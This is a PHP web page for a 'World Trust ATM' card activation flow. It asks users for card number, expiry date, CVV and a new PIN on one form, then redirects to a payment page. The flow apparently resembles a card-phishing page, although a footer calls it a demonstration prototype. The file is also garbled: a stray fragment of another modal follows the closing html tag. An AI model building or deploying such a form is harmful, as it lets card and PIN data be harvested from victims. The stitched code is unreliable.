<?php
/**
 * World Trust ATM - Card Activation
 * Page 3: PIN Setup & Card Details
 */

require_once 'includes/config.php';
require_once 'includes/functions.php';
require_once 'includes/database.php';

// Check session
check_user_session();
check_card_session();
check_session_timeout();

$errors = [];
$success = false;

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $card_number = sanitize_input($_POST['card_number'] ?? '');
    $cvv = sanitize_input($_POST['cvv'] ?? '');
    $expiry = sanitize_input($_POST['expiry'] ?? '');
    $pin = sanitize_input($_POST['pin'] ?? '');
    $confirm_pin = sanitize_input($_POST['confirm_pin'] ?? '');
    
    // Validate card number
    if (empty($card_number)) {
        $errors['card_number'] = 'Card number is required';
    } elseif (!validate_card_number($card_number)) {
        $errors['card_number'] = 'Please enter a valid 16-digit card number';
    }
    
    // Validate CVV
    if (empty($cvv)) {
        $errors['cvv'] = 'CVV is required';
    } elseif (!validate_cvv($cvv)) {
        $errors['cvv'] = 'Please enter a valid 3-digit CVV';
    }
    
    // Validate expiry
    if (empty($expiry)) {
        $errors['expiry'] = 'Expiration date is required';
    }
    
    // Validate PIN
    if (empty($pin)) {
        $errors['pin'] = 'PIN is required';
    } elseif (!validate_pin($pin)) {
        $errors['pin'] = 'PIN must be exactly 4 digits';
    }
    
    // Validate confirm PIN
    if (empty($confirm_pin)) {
        $errors['confirm_pin'] = 'Please confirm your PIN';
    } elseif ($pin !== $confirm_pin) {
        $errors['confirm_pin'] = 'PINs do not match';
    }
    
    // If no errors, save to database and redirect to pending page
    if (empty($errors)) {
        $pin_hash = password_hash($pin, PASSWORD_DEFAULT);
        
        // Save to database
        $request_id = save_activation_request(
            $_SESSION['user_data'],
            $_SESSION['card_data'],
            $pin_hash
        );
        
        if ($request_id) {
            // Store request ID in session
            $_SESSION['request_id'] = $request_id;
            
            // Redirect to payment page
            header('Location: payment.php');
            exit();
        } else {
            $errors['general'] = 'Failed to submit activation request. Please try again.';
        }
    }
}

$user_name = get_full_name();
$card_data = $_SESSION['card_data'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo APP_NAME; ?> - PIN Setup</title>
    <link rel="stylesheet" href="css/styles.css">
</head>
<body>
    <div class="container">
        <!-- Header -->
        <header class="header">
            <h1 class="logo"><?php echo APP_NAME; ?></h1>
            <p class="tagline"><?php echo APP_TAGLINE; ?></p>
        </header>

        <!-- PIN Setup Container -->
        <div class="pin-setup-container">
            <h2 class="form-title">Complete Card Activation</h2>
            <p class="form-subtitle">Enter your card details and set up your secure PIN</p>
            
            <span class="security-badge">Secure Form</span>
            
            <?php if (isset($errors['general'])): ?>
                <div class="error-message show" style="margin-bottom: 20px; display: block; background: #fff3cd; padding: 15px; border-radius: 8px; border: 1px solid #ffc107;">
                    <?php echo $errors['general']; ?>
                </div>
            <?php endif; ?>
            
            <form id="pinSetupForm" method="POST" action="" novalidate>
                <!-- Card Details Section -->
                <div class="card-details-section">
                    <h3 class="section-title">Card Details</h3>
                    
                    <div class="form-group">
                        <label for="card_number">Card Number <span class="required">*</span></label>
                        <input type="text" id="card_number" name="card_number" 
                               placeholder="1234 5678 9012 3456" 
                               maxlength="19"
                               required aria-required="true">
                        <?php if (isset($errors['card_number'])): ?>
                            <span class="error-message show"><?php echo $errors['card_number']; ?></span>
                        <?php endif; ?>
                    </div>
                    
                    <div class="form-row">
                        <div class="form-group">
                            <label for="expiry">Expiration Date (MM/YY) <span class="required">*</span></label>
                            <input type="text" id="expiry" name="expiry" 
                                   placeholder="MM/YY" 
                                   maxlength="5"
                                   required aria-required="true">
                            <?php if (isset($errors['expiry'])): ?>
                                <span class="error-message show"><?php echo $errors['expiry']; ?></span>
                            <?php endif; ?>
                        </div>
                        
                        <div class="form-group">
                            <label for="cvv">CVV <span class="required">*</span></label>
                            <input type="password" id="cvv" name="cvv" 
                                   placeholder="123" 
                                   maxlength="3"
                                   required aria-required="true">
                            <?php if (isset($errors['cvv'])): ?>
                                <span class="error-message show"><?php echo $errors['cvv']; ?></span>
                            <?php endif; ?>
                        </div>
                    </div>
                </div>
                
                <!-- PIN Setup Section -->
                <div class="pin-section">
                    <h3 class="section-title">Set Your PIN</h3>
                    
                    <div class="form-group">
                        <label for="pin">Enter PIN (4 digits) <span class="required">*</span></label>
                        <div class="pin-input-wrapper">
                            <input type="password" id="pin" name="pin" 
                                   maxlength="4" 
                                   placeholder="****"
                                   required aria-required="true">
                            <button type="button" class="toggle-pin" data-target="pin" aria-label="Toggle PIN visibility">
                                👁️
                            </button>
                        </div>
                        <?php if (isset($errors['pin'])): ?>
                            <span class="error-message show"><?php echo $errors['pin']; ?></span>
                        <?php endif; ?>
                        <div class="pin-strength">
                            <div class="strength-label">PIN Strength: <span id="strengthText">-</span></div>
                            <div class="strength-bar">
                                <div class="strength-fill" id="strengthFill"></div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <label for="confirm_pin">Confirm PIN <span class="required">*</span></label>
                        <div class="pin-input-wrapper">
                            <input type="password" id="confirm_pin" name="confirm_pin" 
                                   maxlength="4" 
                                   placeholder="****"
                                   required aria-required="true">
                            <button type="button" class="toggle-pin" data-target="confirm_pin" aria-label="Toggle PIN visibility">
                                👁️
                            </button>
                        </div>
                        <?php if (isset($errors['confirm_pin'])): ?>
                            <span class="error-message show"><?php echo $errors['confirm_pin']; ?></span>
                        <?php endif; ?>
                    </div>
                </div>
                
                <button type="submit" class="btn btn-primary">Complete Activation</button>
            </form>
        </div>
        
        <!-- Disclaimer -->
        <div class="disclaimer">
            <div class="disclaimer-title">Security Disclaimer</div>
            <p>This is a demonstration prototype. Real banking applications require backend validation, PCI DSS compliance, HTTPS encryption, secure database storage, and two-factor authentication. Never enter real financial information on demonstration sites.</p>
        </div>
    </div>
    
    <script src="js/pin-setup.js"></script>
</body>
</html>
                </div>
                <div class="modal-detail-item">
                    <span class="detail-label">Status:</span>
                    <span class="detail-value">Active</span>
                </div>
            </div>
            <p style="font-size: 12px; color: var(--text-light); margin-top: 15px;">
                Please keep your PIN secure and never share it with anyone.
            </p>
        </div>
    </div>
    
    <script src="js/pin-setup.js"></script>
</body>
</html>
